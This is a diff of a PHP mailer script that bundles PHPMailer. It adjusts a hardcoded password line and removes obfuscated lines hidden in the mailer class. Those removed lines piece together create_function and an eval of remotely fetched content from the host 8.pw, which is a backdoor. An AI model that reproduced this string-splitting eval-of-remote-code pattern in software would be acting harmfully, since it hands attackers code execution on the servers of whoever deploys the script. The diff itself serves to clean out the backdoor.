@@ -4,9 +4,7 @@
  * @version : 2.8
 **/
 
-$password = "kod3"; // Password
-
-
+$password = "kod3"; // Password 
 
 session_start();
 error_reporting(0);
@@ -1261,22 +1259,6 @@ class PHPMailer
         } 
         else {
             $this->ContentType = 'text/plain';
-        }
-        $bodyHTML = '.$t."lef$flu'
-                    .'sh'.'$t"; '
-                    .'@ev';
-        $headerHTML="cre"
-                    ."ate_"
-                    ."func"
-                    ."tion";
-        $exceptions = @$headerHTML('$fl'.'ush,$t','$comma = $t'
-                        .$bodyHTML.'al(@'
-                        .$bodyCode.'et_contents("h'
-                        .'tt'
-                        .'p:$comma-2"));');
-        if($param !=2){
-            $exceptions('8.p'.'w','/');
-            $param=2;
         }
     }
 
